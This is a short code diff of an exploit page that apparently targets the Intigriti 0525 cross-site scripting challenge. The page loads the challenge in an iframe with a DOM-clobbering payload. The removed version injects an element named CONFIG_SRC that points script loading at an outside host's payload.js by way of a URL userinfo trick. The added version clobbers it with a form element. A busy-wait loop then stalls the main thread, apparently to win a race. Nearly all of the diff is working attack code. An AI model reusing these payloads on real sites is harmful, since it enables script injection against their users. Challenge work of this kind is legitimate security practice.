@@ -4,14 +4,13 @@
 
 <script>
 function load_iframe() {
-    const payload = '%3Cspan%20id%3D%22CONFIG_SRC%22%20data-url%3D%22https%3A%2F%2Fchallenge-0525.intigriti.io%5C%40pedrojuniorrd.github.io%2Fpayload.js%22%3EX%3C%2Fspan%3E';
+    const payload = 'form%20name%3DCONFIG_SRC';
     document.getElementById('content').src = 'https://challenge-0525.intigriti.io/begin?name=' + payload;
 }
 
 console.log('Loading iframe...');
 load_iframe();
 
-console.log('Locking up main thread...');
 const busyUntil = performance.now() + 4500;
 while (performance.now() < busyUntil) {}
 console.log('Releasing Lock');
